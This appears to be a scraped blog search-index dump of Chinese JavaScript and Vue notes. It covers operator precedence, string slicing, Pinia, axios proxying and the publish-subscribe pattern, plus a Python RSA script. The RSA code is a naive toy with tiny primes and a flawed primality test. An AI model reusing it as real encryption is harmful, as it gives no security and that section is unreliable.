的概念，但我们还是要先说说这一问涉及的运算符优先级问题，可能你看过其它文章解析这一问的时候会说等价于 (new Foo()).getName()，可你知道为什么会是这样吗？为什么第 5 问是先执行 Foo.getName() 而这一问却是先执行 new Foo() 呢？ 这是因为 new 运算在优先级上有两种形式，一种是带参数列表: new … ( … ) 优先级 18，另一种是无参数列表: new … 优先级 17，如果优先级不同那么按优先级最高的运算符先执行，不用考虑结合性（比如 1 + 1 * 2 执行起来就是 1 + (1 * 2)），如果优先级相同则按结合性执行（比如赋值运算结合性是”从右到左”，所以 a = b = 1 实际为 a = (b = 1)），所以这就解释了为什么这一问会是 new Foo() 先执行，画个图就理解了： 在上一问里成员访问优先级是18，new(无参列表)优先级是17，优先级不同，则高优先级先执行，所以上一问先执行 Foo.getName()；这一问里 new(带参列表)优先级与成员访问同属18，优先级相同，并行下看结合性，new 带参时结合性不相关，所以直接执行，成员访问结合性从左到右，所以先拿出 Foo() 执行，于是得出了上面等价于 (new Foo()).getName() 的结论。 接下来就是 new 的相关概念了，首先我们要知道 new 关键字做了什么： 创建新对象并将 .__proto__ 指向构造函数的 .prototype 将 this 指向新创建的对象 返回新对象 回到题目当中，new Foo() 以 Foo 为原型创建了一个新对象，这个实例本身并没有 geiName 这个方法，但是题目 c 处在 Foo 函数的原型上挂载过一个 getName 方法，最终实例会通过原型链访问到 Foo.prototype.getName() 这个方法，结果输出 3 。 原型链知识点：每个函数实例对象都有一个 __proto__ 属性，__proto__ 指向了 prototype，当访问实例对象的属性或方法，会先从自身构造函数中查找，如果找不到就通过 __proto__ 去原型中查找。 7. new new Foo().getName()考察的上一问其实已经讲完了，还是一样画张图： 所以得出实际执行的是：new(new Foo().getName()) new Foo().getName() 在上一问可知实例最终访问 Foo 原型链上的方法，最终为创建 new(Foo.prototype.getName()) 的实例返回，结果输出 3 。 作者：茶无味的一天链接：https://juejin.cn/post/7140901067327275044来源：稀土掘金著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 第十五题Instanceof能否判断基本数据类型？能。比如下面这种方式: class PrimitiveNumber &#123; static [Symbol.hasInstance](x) &#123; return typeof x === 'number' &#125; &#125; console.log(111 instanceof PrimitiveNumber) // true 其实就是自定义instanceof行为的一种方式，这里将原有的instanceof方法重定义，换成了typeof，因此能够判断基本数据类型。 作者：马祎繁链接：https://juejin.cn/post/7130161240181047309来源：稀土掘金著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 第十六题 for in ;for offor in 遍历 key；for of 遍历value let arr=[1,2,3,4] for( var key in arr)&#123; console.log('key',key) &#125; for( var value of arr)&#123; console.log('value',value) &#125;"},{"title":"奇奇怪怪网站记录","path":"/post/3594.html","text":"开发工具： 前端开发：smooth shadow url:https://shadows.brumm.af/ GrabientCSS 在线渐变色搭配网址，你可以更改自己喜欢的渐变色或者使用提供的渐变色案例，只需单击【COPY CSS】复制 CSS 渐变色代码，马上用到你的网站设计里面。 传送门：https://www.grabient.com/ ColorffyColorffy 设计师必备配色神器，能够快速生成渐变、调色板和配色方案的色彩搭配工具箱，包含网格渐变、CSS 渐变、调色板、文本渐变、配色方案、图像调色板、颜色对比、随机颜色等等在线生成器，能够最直观的看到配色效果的工具箱，加入了很多渐变色探索的功能，能够让你更加微妙的对渐变色进行深度探索，无论是前端设计、还是 UI 设计师都不容错过，可以说是设计师最迷你的配色神器。 传送门：https://colorffy.com/ HeroiconsHeroicons 一个漂亮时尚且纯手工创作的 SVG 图标库，由 Tailwind CSS 制造商创作。目前图标库的版本有 1.0.6 和最新的 2.0.0 版本，你完全可以通过 Figma 获取源文件，重新二次美化。Heroicons 分成了三大图标类型，分别是 Outline 线框图标、Solid 固体图标、以及 Mini 迷你图标，每一种类型的图标应用的场景有所不同，可以用于网站导航、应用程序、按钮等等，你可以直接复制 SVG 或者 JSX 代码，用于 UI 设计开发，有需要的前端设计师可不要错过的图标资源哦。 传送门：https://heroicons.com/ RecodedRecoded 为程序开发人员的模型生成器，能够将您的代码变成精美的图像和视频，提供了五种模型风格，支持市面上所有主流的开发语言，比如 C++、Java、C#、C 语言、Python、HTML、CSS、JSON、PHP 等等，只需要复制你的代码到界面窗口，然后选择好开发语言、模型风格、以及背景样式，就可以看到漂亮的代码样机模型，你可以分享到朋友圈、微博等等社交媒体，除了生成 PNG 图片，还可以生成运行视频，只需要调整帧的持续时间，太酷了，废话不多说，一起来尝试下吧。 传送门：https://recoded.netlify.app/ CSS LayoutCSS Layout 一个国外现代 CSS 布局项目，涵盖了现代互联网最流行的 UI 模式，全部的 CSS 布局案例都是纯 CSS 代码编写，不依赖任何外部库和 JS 脚本，通过最精简的 CSS 代码实现最好效果的 Web 页面，只需要单击任意一个 CSS 布局案例，就可以获取到 CSS 代码片段，完全可以复制粘贴到你的网页设计项目，多练习多熟记，让 CSS 学习变得轻而易举~ 传送门：https://csslayout.io/ 看电影片库 url:https://www.btnull.re/ 软件下载异星： url:https://www.yxssp.com/ office tools: url:https://otp.landian.vip/zh-cn/ 软件sos url:https://www.rjsos.com/ 老殁 url:https://www.mpyit.com/ ppt模板站长素材 url：https://sc.chinaz.com/ppt/ 优品ppt url:https://www.ypppt.com/ 音乐下载煎饼搜 - 音乐免费下载网 url:https://www.jbsou.cn/ 前端模板模板王： url:http://www.mobanwang.com/mb/"},{"title":"js中截取字符串的三个方法 substring()、substr()、slice()","path":"/post/a426.html","text":"js中有三个截取字符的方法，分别是substring()、substr()、slice()，平时我们可能都用到过，但总是会对这些方法有点混淆，特别是substring()和substr()，连方法名都差不多，下面就具体来看一下区别。 相同点这三个方法都可以对字符串进行截取，并且返回一个新的字符串，也就是不会对原字符串进行修改 //chrome控制台 > var a = '0123456789' &lt; undefined > a.substr(1,5) &lt; \"12345\" > a &lt; \"0123456789\" //没有发生改变 不同点这三个方法的不同之处在于参数不同。 substring substring() 方法用于提取字符串中介于两个指定下标之间的字符。 语法 string.substring(start,stop) 参数 参数 描述 start 必需。一个非负的整数，规定要提取的子串的第一个字符在 string 中的位置。 stop 可选。一个非负的整数，比要提取的子串的最后一个字符在 string 中的位置多 1。如果省略该参数，那么返回的子串会一直到字符串的结尾。 说明 1.substring() 方法返回的子串包括 start 处的字符，但不包括 stop 处的字符。 //chrome控制台 > var a = '0123456789' &lt; undefined > a.substring(1,5) &lt; \"1234\" 2.如果参数 start 与 stop 相等，那么该方法返回的就是一个空串（即长度为 0 的字符串）。 //chrome控制台 > var a = '0123456789' &lt; undefined > a.substring(1,1) &lt; \"\" 3.如果 start 比 stop 大，那么该方法在提取子串之前会先交换这两个参数。 //chrome控制台 > var a = '0123456789' &lt; undefined > a.substring(5,1) //=>a.substring(1,5) &lt; \"1234\" 4.如果 start 和 stop 有负数，那么会把该参数自动转为0，然后继续上述规则。 //chrome控制台 > var a = '0123456789' &lt; undefined > a.substring(5,-1) //=>a.substring(5,0) => a.substring(0,5) &lt; \"1234\" 5.如果 start 和 stop 有正小数（负数直接进行第4条），那么会把该参数向下取整，然后继续上述规则。 //chrome控制台 > var a = '0123456789' &lt; undefined > a.substring(5,2.5) //=>a.substring(5,2) => a.substring(2,5) &lt; \"234\" 6.如果 start 和 stop 有字符串，那么会先进行parseInt()，如果转换结果为NaN，那么就转换为0，其余情况继续上述规则。 //chrome控制台 > var a = '0123456789' &lt; undefined > a.substring(5,'2.5') // =>a.substring(5,2) => a.substring(2,5) &lt; \"234\" > a.substring(5,'ss') // =>a.substring(5,2) =>a.substring(5,0) => a.substring(2,5) &lt; \"234\" 其他情况就没有一一测试了，当然正常情况下尽量不要这么干，毕竟语法上已经规定了是整数。 substr substr() 方法可在字符串中抽取从 start 下标开始的指定数目的字符。 语法 string.substr(start,length) 重要事项：ECMAscript 没有对该方法进行标准化，因此反对使用它。 参数 参数 描述 start 必需。要抽取的子串的起始下标。必须是数值。如果是负数，那么该参数声明从字符串的尾部开始算起的位置。也就是说，-1 指字符串中最后一个字符，-2 指倒数第二个字符，以此类推。 length 可选。子串中的字符数。必须是数值。如果省略了该参数，那么返回从 string 的开始位置到结尾的字串。 说明 该方法与substring()最大的区别在于第二个参数是你需要截取字符串的长度，而不是位置。 1.substr() 方法返回的子串从 start 处的字符开始（包括）往后截取length长度，如果超过最末端就到最末端结束。 //chrome控制台 > var a = '0123456789' &lt; undefined > a.substr(1,5) &lt; \"12345\" > a.substr(1,15) //只会到最末端，多了没用 &lt; \"123456789\" 2.start可以取负值，表示从字符串尾部往头部开始数（从右到左，注意是从1开始，比如-1 指字符串中最后一个字符），但是截取长度还是从左到右，如果超过最末端就到最末端结束。 //chrome控制台 > var a = '0123456789' &lt; undefined > a.substr(-4,2) //-4表示从右开始数第4个，就是'6'，然后取2个长度的字符串，就是'67' &lt; \"67\" 3.如果length为负值，那么会直接当成0处理，最终返回&quot;&quot;。 //chrome控制台 > var a = '0123456789' &lt; undefined > a.substr(4,-2) // => a.substr(4,0) &lt; \"\" 4.如果start或者length为小数，那么会截取小数部分。 //chrome控制台 > var a = '0123456789' &lt; undefined > a.substr(1.2,5.2) // => a.substr(1,5) &lt; \"12345\" 5.如果 start 和 length 有字符串，那么会先进行parseInt()，如果转换结果为NaN，那么就转换为0，其余情况继续上述规则。 //chrome控制台 > var a = '0123456789' &lt; undefined > a.substr('aa','5') // => a.substr(0,5) &lt; \"01234\" slice slice() 方法可提取字符串的某个部分，并以新的字符串返回被提取的部分。 语法 string.slice(start,end) 参数 参数 描述 start 必须。要抽取的片断的起始下标。如果是负数，则该参数规定的是从字符串的尾部开始算起的位置。也就是说，-1 指字符串的最后一个字符，-2 指倒数第二个字符，以此类推。 end 可选。紧接着要抽取的片段的结尾的下标。若未指定此参数，则要提取的子串包括 start 到原字符串结尾的字符串。如果该参数是负数，那么它规定的是从字符串的尾部开始算起的位置。 该方法的两个参数均为位置坐标，和subtring比较像，区别就是该方法支持负数，并且不会交换位置，始终是从start到end，如果该区间不存在，那么返回&#39;&#39;。 1.slice() 方法返回的子串包括 start 处的字符，但不包括 end 处的字符。 //chrome控制台 > var a = '0123456789' &lt; undefined > a.slice(1,5) &lt; \"1234\" 2.当start或者end为负值时，定位方式和substr一直，从右往左数，从1开始。 //chrome控制台 > var a = '0123456789' &lt; undefined > a.slice(1,-1)//起始点从第1（包括）开始，结束点为从右往左数第1个（不包括） &lt; \"12345678\" 2.start到end的顺序始终是从左到右，如果最终start的位置在end的右边，那么返回&#39;&#39;。 //chrome控制台 > var a = '0123456789' &lt; undefined > a.slice(2,1)//2所在的位置是'2'，1所在的位置是'1'，从2=>1，方向相反，返回为空 &lt; \"\" > a.slice(-2,1)//-2所在的位置是'8'，1所在的位置是'1'，从8=>1，方向相反，返回为空 &lt; \"\" > a.slice(-2,-1)//-2所在的位置是'8'，-1所在的位置是'9'，从8=>9，方向正常，返回为'8' &lt; \"8\" 3.其他情况和substring处理方式一致 //chrome控制台 > var a = '0123456789' &lt; undefined > a.slice('xx','5.5')// => a.slice(0,5) &lt; \"01234\" 小节从上面测试得出结论，substring不支持负值，其他两种方式均支持负数表示，并且是从右边第一位开始计数。substr的第二个参数是长度，这是和其他两种方式最大的不同之处，slice的方向性比较强，永远是从start=&gt;end对应左=&gt;右。"},{"title":"pinia","path":"/post/32d2.html","text":"Pinia介绍：状态管理工具，代替Vuex 安装：npm install pinia 配置：main.ts： import &#123;createPinia&#125; from &#39;pinia&#39;&#x2F;&#x2F;导入 const state &#x3D; createPinia()&#x2F;&#x2F; app.use(state)&#x2F;&#x2F; 初始化仓库src&#x2F;store&#x2F;index.ts import &#123; defineStore &#125; from &#39;pinia&#39; import &#123; names &#125; from &#39;.&#x2F;store_name&#39; export const userTestStore &#x3D; defineStore(names.name, &#123; state: () &#x3D;&gt; &#123; return &#123; name: &#39;kif&#39;, age: 18 &#125; &#125;, getters: &#123;&#125;, &#x2F;&#x2F; actions: &#123;&#125; &#125;) store_name.ts export const names &#x3D; &#123; name: &#39;kif&#39; &#125; 使用：获取&lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; userTestStore &#125; from &#39;..&#x2F;store&#39;; let test &#x3D; userTestStore() &lt;&#x2F;script&gt; &lt;template&gt; store:&#123;&#123; test.name &#125;&#125; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; 修改直接修改&lt;script setup lang&#x3D;&quot;ts&quot;&gt; import &#123; userTestStore &#125; from &#39;..&#x2F;store&#39;; let test &#x3D; userTestStore() const change &#x3D; () &#x3D;&gt; &#123; test.name &#x3D; &#39;kif2&#39; test.age++ &#125; &lt;&#x2F;script&gt; &lt;template&gt; store:&#123;&#123; test.name &#125;&#125;--&#123;&#123; test.age &#125;&#125; &lt;br &#x2F;&gt; &lt;button @click&#x3D;&quot;change&quot;&gt;直接修改&lt;&#x2F;button&gt; &lt;&#x2F;template&gt; &lt;style scoped&gt; &lt;&#x2F;style&gt; $patch批量修改 const change2 &#x3D; () &#x3D;&gt; &#123; test.$patch(&#123; name: &#39;kif3&#39;, age: 3 &#125;) &#125; $patch 工厂函数优势是可以逻辑判断 const change3 &#x3D; () &#x3D;&gt; &#123; test.$patch((state) &#x3D;&gt; &#123; if (state.age &lt; 20) &#123; state.age++ &#125; &#125;) &#125; $state缺点，一次必须修改全部 const change4 &#x3D; ()&#x3D;&gt;&#123; test.$state&#x3D;&#123; name : &#39;kif2&#39;, age:67 &#125; &#125; actionactions: &#123; updateData(num:number)&#123; this.name &#x3D; &#39;kifN&#39; this.age+&#x3D;num &#125; &#125; const change5&#x3D;(num:number)&#x3D;&gt;&#123; test.updateData(num) &#125; 解构出来的store数据不具有响应式，可以使用storetoref解决 actions支持同步和异步操作 异步： import &#123; defineStore &#125; from &#39;pinia&#39; import &#123; names &#125; from &#39;.&#x2F;store_name&#39; type data &#x3D; &#123; name: string, age: number &#125; const login &#x3D; (): Promise&lt;data&gt; &#x3D;&gt; &#123; return new Promise((resolve) &#x3D;&gt; &#123; setTimeout(() &#x3D;&gt; &#123; resolve(&#123; name: &#39;kifNew&#39;, age: 189 &#125;) &#125;, 2000) &#125;) &#125; export const userTestStore &#x3D; defineStore(names.name, &#123; state: () &#x3D;&gt; &#123; return &#123; name: &#39;kif&#39;, age: 18 &#125; &#125;, getters: &#123;&#125;, &#x2F;&#x2F; actions: &#123; async Login() &#123; let res &#x3D; await login() this.name &#x3D; res.name this.age &#x3D; res.age &#125; &#125; &#125;) const change6 &#x3D; () &#x3D;&gt; &#123; test.Login() &#125;"},{"title":"vue3+vite+axios中proxy跨域配置","path":"/post/4955.html","text":"axios引入安装： npm install axios -S src目录下创建api目录，下新建axios.js axios.js import axios from 'axios' // 创建一个 axios 实例 const service = axios.create(&#123; baseURL: '/api', // 所有的请求地址前缀部分 timeout: 60000, // 请求超时时间毫秒 withCredentials: true, // 异步请求携带cookie headers: &#123; // 设置后端需要的传参类型 'Content-Type': 'application/json', 'token': 'your token', 'X-Requested-With': 'XMLHttpRequest', &#125;, &#125;) // 添加请求拦截器 service.interceptors.request.use( function (config) &#123; // 在发送请求之前做些什么 return config &#125;, function (error) &#123; // 对请求错误做些什么 console.log(error) return Promise.reject(error) &#125; ) // 添加响应拦截器 service.interceptors.response.use( function (response) &#123; // console.log(response) // 2xx 范围内的状态码都会触发该函数。 // 对响应数据做点什么 // dataAxios 是 axios 返回数据中的 data const dataAxios = response.data // 这个状态码是和后端约定的 const code = dataAxios.reset return dataAxios &#125;, function (error) &#123; // 超出 2xx 范围的状态码都会触发该函数。 // 对响应错误做点什么 console.log(error) return Promise.reject(error) &#125; ) export default service 调用： import service from &#39;..&#x2F;axios&#39; export function getTest() &#123; return service(&#123; url: &#39;&#x2F;pyq&#x2F;index.php&#39;,&#x2F;&#x2F;Api就是proxy中的target地址 method: &quot;get&quot; &#125;) &#125; export function apiGetUserInfo() &#123; return service(&#123; method: &#39;get&#39;, url: &#39;&#x2F;api&#x2F;topbaidu&#x2F;index.php&#39;,&#x2F;&#x2F;Api就是proxy中的target地址 &#125;) &#125; &lt;script setup&gt; import &#123; onBeforeMount &#125; from &#39;vue&#39; import &#123; getTest, apiGetUserInfo &#125; from &#39;..&#x2F;api&#x2F;demo&#x2F;test&#39; onBeforeMount(() &#x3D;&gt; &#123; apiGetUserInfo().then(res &#x3D;&gt; &#123; console.log(res) &#125;) &#x2F;&#x2F; 这里的res是一个promise对象 &#125;) &lt;&#x2F;script&gt; 代理设置根目录下新建 vite.config.js module.exports = &#123; proxy:&#123; '/api':&#123; target:' https://v.api.aa1.cn', changeOrigin:true, // 允许跨域 rewrite:path => path.replace(/^\\/api/,'') &#125; &#125; &#125;"},{"title":"js发布订阅","path":"/post/5478.html","text":"发布-订阅模式，看似陌生，其实不然。工作中经常会用到，例如 Node.js EventEmitter 中的 on 和 emit 方法；Vue 中的 $on 和 $emit 方法。他们都使用了发布-订阅模式，让开发变得更加高效方便。 一、 什么是发布-订阅模式1. 定义发布-订阅模式其实是一种对象间一对多的依赖关系，当一个对象的状态发送改变时，所有依赖于它的对象都将得到状态改变的通知。 订阅者（Subscriber）把自己想订阅的事件注册（Subscribe）到调度中心（Event Channel），当发布者（Publisher）发布该事件（Publish Event）到调度中心，也就是该事件触发时，由调度中心统一调度（Fire Event）订阅者注册到调度中心的处理代码。 2. 例子比如我们很喜欢看某个公众号号的文章，但是我们不知道什么时候发布新文章，要不定时的去翻阅；这时候，我们可以关注该公众号，当有文章推送时，会有消息及时通知我们文章更新了。 上面一个看似简单的操作，其实是一个典型的发布订阅模式，公众号属于发布者，用户属于订阅者；用户将订阅公众号的事件注册到调度中心，公众号作为发布者，当有新文章发布时，公众号发布该事件到调度中心，调度中心会及时发消息告知用户。 二、 如何实现发布-订阅模式？1. 实现思路 创建一个对象 在该对象上创建一个缓存列表（调度中心） on 方法用来把函数 fn 都加到缓存列表中（订阅者注册事件到调度中心） emit 方法取到 arguments 里第一个当做 event，根据 event 值去执行对应缓存列表中的函数（发布者发布事件到调度中心，调度中心处理代码） off 方法可以根据 event 值取消订阅（取消订阅） once 方法只监听一次，调用完毕后删除缓存函数（订阅一次） 2. demo1我们来看个简单的 demo，实现了 on 和 emit 方法，代码中有详细注释。 // 公众号对象 let eventEmitter = &#123;&#125;; // 缓存列表，存放 event 及 fn eventEmitter.list = &#123;&#125;; // 订阅 eventEmitter.on = function (event, fn) &#123; let _this = this; // 如果对象中没有对应的 event 值，也就是说明没有订阅过，就给 event 创建个缓存列表 // 如有对象中有相应的 event 值，把 fn 添加到对应 event 的缓存列表里 (_this.list[event] || (_this.list[event] = [])).push(fn); return _this; &#125;; // 发布 eventEmitter.emit = function () &#123; let _this = this; // 第一个参数是对应的 event 值，直接用数组的 shift 方法取出 let event = [].shift.call(arguments), fns = [..._this.list[event]]; // 如果缓存列表里没有 fn 就返回 false if (!fns || fns.length === 0) &#123; return false; &#125; // 遍历 event 值对应的缓存列表，依次执行 fn fns.forEach(fn => &#123; fn.apply(_this, arguments); &#125;); return _this; &#125;; function user1 (content) &#123; console.log('用户1订阅了:', content); &#125;; function user2 (content) &#123; console.log('用户2订阅了:', content); &#125;; // 订阅 eventEmitter.on('article', user1); eventEmitter.on('article', user2); // 发布 eventEmitter.emit('article', 'Javascript 发布-订阅模式'); /* 用户1订阅了: Javascript 发布-订阅模式 用户2订阅了: Javascript 发布-订阅模式 */ 3. demo2这一版中我们补充了一下 once 和 off 方法。 let eventEmitter = &#123; // 缓存列表 list: &#123;&#125;, // 订阅 on (event, fn) &#123; let _this = this; // 如果对象中没有对应的 event 值，也就是说明没有订阅过，就给 event 创建个缓存列表 // 如有对象中有相应的 event 值，把 fn 添加到对应 event 的缓存列表里 (_this.list[event] || (_this.list[event] = [])).push(fn); return _this; &#125;, // 监听一次 once (event, fn) &#123; // 先绑定，调用后删除 let _this = this; function on () &#123; _this.off(event, on); fn.apply(_this, arguments); &#125; on.fn = fn; _this.on(event, on); return _this; &#125;, // 取消订阅 off (event, fn) &#123; let _this = this; let fns = _this.list[event]; // 如果缓存列表中没有相应的 fn，返回false if (!fns) return false; if (!fn) &#123; // 如果没有传 fn 的话，就会将 event 值对应缓存列表中的 fn 都清空 fns &amp;&amp; (fns.length = 0); &#125; else &#123; // 若有 fn，遍历缓存列表，看看传入的 fn 与哪个函数相同，如果相同就直接从缓存列表中删掉即可 let cb; for (let i = 0, cbLen = fns.length; i &lt; cbLen; i++) &#123; cb = fns[i]; if (cb === fn || cb.fn === fn) &#123; fns.splice(i, 1); break &#125; &#125; &#125; return _this; &#125;, // 发布 emit () &#123; let _this = this; // 第一个参数是对应的 event 值，直接用数组的 shift 方法取出 let event = [].shift.call(arguments), fns = [..._this.list[event]]; // 如果缓存列表里没有 fn 就返回 false if (!fns || fns.length === 0) &#123; return false; &#125; // 遍历 event 值对应的缓存列表，依次执行 fn fns.forEach(fn => &#123; fn.apply(_this, arguments); &#125;); return _this; &#125; &#125;; function user1 (content) &#123; console.log('用户1订阅了:', content); &#125; function user2 (content) &#123; console.log('用户2订阅了:', content); &#125; function user3 (content) &#123; console.log('用户3订阅了:', content); &#125; function user4 (content) &#123; console.log('用户4订阅了:', content); &#125; // 订阅 eventEmitter.on('article1', user1); eventEmitter.on('article1', user2); eventEmitter.on('article1', user3); // 取消user2方法的订阅 eventEmitter.off('article1', user2); eventEmitter.once('article2', user4) // 发布 eventEmitter.emit('article1', 'Javascript 发布-订阅模式'); eventEmitter.emit('article1', 'Javascript 发布-订阅模式'); eventEmitter.emit('article2', 'Javascript 观察者模式'); eventEmitter.emit('article2', 'Javascript 观察者模式'); // eventEmitter.on('article1', user3).emit('article1', 'test111'); /* 用户1订阅了: Javascript 发布-订阅模式 用户3订阅了: Javascript 发布-订阅模式 用户1订阅了: Javascript 发布-订阅模式 用户3订阅了: Javascript 发布-订阅模式 用户4订阅了: Javascript 观察者模式 */ 三、 Vue 中的实现有了发布-订阅模式的知识后，我们来看下 Vue 中怎么实现 $on 和 $emit 的方法，直接看源码： function eventsMixin (Vue) &#123; var hookRE &#x3D; &#x2F;^hook:&#x2F;; Vue.prototype.$on &#x3D; function (event, fn) &#123; var this$1 &#x3D; this; var vm &#x3D; this; &#x2F;&#x2F; event 为数组时，循环执行 $on if (Array.isArray(event)) &#123; for (var i &#x3D; 0, l &#x3D; event.length; i &lt; l; i++) &#123; this$1.$on(event[i], fn); &#125; &#125; else &#123; (vm._events[event] || (vm._events[event] &#x3D; [])).push(fn); &#x2F;&#x2F; optimize hook:event cost by using a boolean flag marked at registration &#x2F;&#x2F; instead of a hash lookup if (hookRE.test(event)) &#123; vm._hasHookEvent &#x3D; true; &#125; &#125; return vm &#125;; Vue.prototype.$once &#x3D; function (event, fn) &#123; var vm &#x3D; this; &#x2F;&#x2F; 先绑定，后删除 function on () &#123; vm.$off(event, on); fn.apply(vm, arguments); &#125; on.fn &#x3D; fn; vm.$on(event, on); return vm &#125;; Vue.prototype.$off &#x3D; function (event, fn) &#123; var this$1 &#x3D; this; var vm &#x3D; this; &#x2F;&#x2F; all，若没有传参数，清空所有订阅 if (!arguments.length) &#123; vm._events &#x3D; Object.create(null); return vm &#125; &#x2F;&#x2F; array of events，events 为数组时，循环执行 $off if (Array.isArray(event)) &#123; for (var i &#x3D; 0, l &#x3D; event.length; i &lt; l; i++) &#123; this$1.$off(event[i], fn); &#125; return vm &#125; &#x2F;&#x2F; specific event var cbs &#x3D; vm._events[event]; if (!cbs) &#123; &#x2F;&#x2F; 没有 cbs 直接 return this return vm &#125; if (!fn) &#123; &#x2F;&#x2F; 若没有 handler，清空 event 对应的缓存列表 vm._events[event] &#x3D; null; return vm &#125; if (fn) &#123; &#x2F;&#x2F; specific handler，删除相应的 handler var cb; var i$1 &#x3D; cbs.length; while (i$1--) &#123; cb &#x3D; cbs[i$1]; if (cb &#x3D;&#x3D;&#x3D; fn || cb.fn &#x3D;&#x3D;&#x3D; fn) &#123; cbs.splice(i$1, 1); break &#125; &#125; &#125; return vm &#125;; Vue.prototype.$emit &#x3D; function (event) &#123; var vm &#x3D; this; &#123; &#x2F;&#x2F; 传入的 event 区分大小写，若不一致，有提示 var lowerCaseEvent &#x3D; event.toLowerCase(); if (lowerCaseEvent !&#x3D;&#x3D; event &amp;&amp; vm._events[lowerCaseEvent]) &#123; tip( &quot;Event \\&quot;&quot; + lowerCaseEvent + &quot;\\&quot; is emitted in component &quot; + (formatComponentName(vm)) + &quot; but the handler is registered for \\&quot;&quot; + event + &quot;\\&quot;. &quot; + &quot;Note that HTML attributes are case-insensitive and you cannot use &quot; + &quot;v-on to listen to camelCase events when using in-DOM templates. &quot; + &quot;You should probably use \\&quot;&quot; + (hyphenate(event)) + &quot;\\&quot; instead of \\&quot;&quot; + event + &quot;\\&quot;.&quot; ); &#125; &#125; var cbs &#x3D; vm._events[event]; if (cbs) &#123; cbs &#x3D; cbs.length &gt; 1 ? toArray(cbs) : cbs; &#x2F;&#x2F; 只取回调函数，不取 event var args &#x3D; toArray(arguments, 1); for (var i &#x3D; 0, l &#x3D; cbs.length; i &lt; l; i++) &#123; try &#123; cbs[i].apply(vm, args); &#125; catch (e) &#123; handleError(e, vm, (&quot;event handler for \\&quot;&quot; + event + &quot;\\&quot;&quot;)); &#125; &#125; &#125; return vm &#125;; &#125; &#x2F;*** * Convert an Array-like object to a real Array. *&#x2F; function toArray (list, start) &#123; start &#x3D; start || 0; var i &#x3D; list.length - start; var ret &#x3D; new Array(i); while (i--) &#123; ret[i] &#x3D; list[i + start]; &#125; return ret &#125; 实现思路大体相同，如上第二点中的第一条：实现思路。Vue 中实现的方法支持订阅数组事件。 四、 总结1. 优点 对象之间解耦 异步编程中，可以更松耦合的代码编写 2. 缺点 创建订阅者本身要消耗一定的时间和内存 虽然可以弱化对象之间的联系，多个发布者和订阅者嵌套一起的时候，程序难以跟踪维护 五、 扩展（发布-订阅模式与观察者模式的区别）很多地方都说发布-订阅模式是观察者模式的别名，但是他们真的一样吗？是不一样的。 直接上图： **观察者模式**：观察者（Observer）直接订阅（Subscribe）主题（Subject），而当主题被激活的时候，会触发（Fire Event）观察者里的事件。 **发布订阅模式**：订阅者（Subscriber）把自己想订阅的事件注册（Subscribe）到调度中心（Event Channel），当发布者（Publisher）发布该事件（Publish Event）到调度中心，也就是该事件触发时，由调度中心统一调度（Fire Event）订阅者注册到调度中心的处理代码。 **差异**： 在观察者模式中，观察者是知道 Subject 的，Subject 一直保持对观察者进行记录。然而，在发布订阅模式中，发布者和订阅者不知道对方的存在。它们只有通过消息代理进行通信。 在发布订阅模式中，组件是松散耦合的，正好和观察者模式相反。 观察者模式大多数时候是同步的，比如当事件触发，Subject 就会去调用观察者的方法。而发布-订阅模式大多数时候是异步的（使用消息队列）。 观察者模式需要在单个应用程序地址空间中实现，而发布-订阅更像交叉应用模式。"},{"title":"RSA数据加解密算法","path":"/post/1538.html","text":"主要代码： # /* # * @Author: kif kif101001000@163.com # * @Date: 2022-05-30 22:34:47 # * @Last Modified by: kif kif101001000@163.com # * @Last Modified time: 2022-05-30 22:34:47 # */ import random import math # 模N大数的幂乘的快速算法 def fastExpMod(b, e, m): # 底数，幂，大数N result = 1 e = int(e) while e != 0: if e % 2 != 0: # 按位与 e -= 1 result = (result * b) % m continue e >>= 1 b = (b * b) % m return result # 针对随机取得p，q两个数的素性检测 def miller_rabin_test(n): # p为要检验得数 p = n - 1 r = 0 # P110定理5.17 P108定理5.3.6 # 寻找满足n-1 = 2^s * m 的s,m两个数 # n -1 = 2^r * p while p % 2 == 0: # 最后得到为奇数的p(即m) r += 1 p /= 2 b = random.randint(2, n - 2) # 随机取b=（0.n） # 如果情况1 b得p次方 与1 同余 mod n if fastExpMod(b, int(p), n) == 1: return True # 通过测试,可能为素数 # 情况2 b得（2^r *p）次方 与-1 (n-1) 同余 mod n for i in range(0,7): # 检验六次 if fastExpMod(b, (2 ** i) * p, n) == n - 1: return True # 如果该数可能为素数， return False # 不可能是素数 # 生成大素数： def create_prime_num(keylength): # 为了确保两素数乘积n 长度不会太长，使用keylength/2 while True: # Select a random number n # n = random.randint(0, 1&lt;&lt;int(halfkeyLength)) n = random.randint(0, keylength) if n % 2 != 0: found = True # 如果经过10次素性检测，那么很大概率上，这个数就是素数 for i in range(0, 10): if miller_rabin_test(n): pass else: found = False break if found: return n # 生成密钥（包括公钥和私钥） def create_keys(keylength): p = create_prime_num(keylength / 2) q = create_prime_num(keylength / 2) n = p * q # euler函数值 fn = (p - 1)*(q - 1) e = selectE(fn, keylength / 2) d = match_d(e, fn) return (n, e, d) # 随机在（1，fn）选择一个E， 满足gcd（e,fn）=1 def selectE(fn, halfkeyLength): while True: # e and fn are relatively prime e = random.randint(0, fn) if math.gcd(e, fn) == 1: return e # 根据选择的e，匹配出唯一的d def match_d(e, fn): d = 0 while True: if (e * d) % fn == 1: return d d += 1 def encrypt(M, e, n): return fastExpMod(M, e, n) def decrypt( C, d, m): return fastExpMod(C, d, m) def encrypt_file(): mess=input() n, e, d = create_keys(1024) print(n,d) s = '' for ch in mess: c = chr(encrypt(ord(ch), e, n)) s += c f = open(\"./pass.txt\", \"w\", encoding='utf-8') f.write(str(s)) print(\"Encrypt Done!\") def decrypt_file(): f = open('./pass.txt', 'rb') mess = f.read().decode('utf-8') f.close() n,d= map(int, input(\"（n,d）:\").split()) s = '' for ch in mess: c = chr(decrypt(ord(ch), d, n)) s += c print(str(s)) print(\"Decrypt Done!\")"},{"title":"JS数组reduce()方法详解及高级技巧","path":"/post/23df.html","text":"reduce()方法可以搞定的东西，for循环，或者forEach方法有时候也可以搞定，那为啥要用reduce()？这个问题，之前我也想过，要说原因还真找不到，唯一能找到的是：通往成功的道路有很多，但是总有一条路是最捷径的，亦或许reduce()逼格更高… 1、语法arr.reduce(callback,[initialValue]) reduce 